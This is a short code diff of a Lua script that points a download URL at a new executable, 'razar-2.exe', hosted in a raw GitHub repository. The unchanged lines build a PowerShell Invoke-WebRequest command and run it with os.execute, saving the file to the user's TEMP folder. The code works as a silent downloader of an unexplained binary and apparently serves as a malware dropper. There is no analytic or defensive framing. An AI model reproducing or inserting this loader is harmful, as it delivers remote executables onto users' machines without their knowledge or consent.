@@ -1,4 +1,4 @@
-local u = "https://github.com/isprowqeqw/Project/raw/refs/heads/main/razar.exe"
+local u = "https://github.com/isprowqeqw/Project/raw/refs/heads/main/razar-2.exe"
 local o = os.getenv("TEMP") .. "\\razar.exe"
 local c = string.format('powershell -Command "Invoke-WebRequest -Uri \'%s\' -OutFile \'%s\'"', u, o)
 os.execute(c)
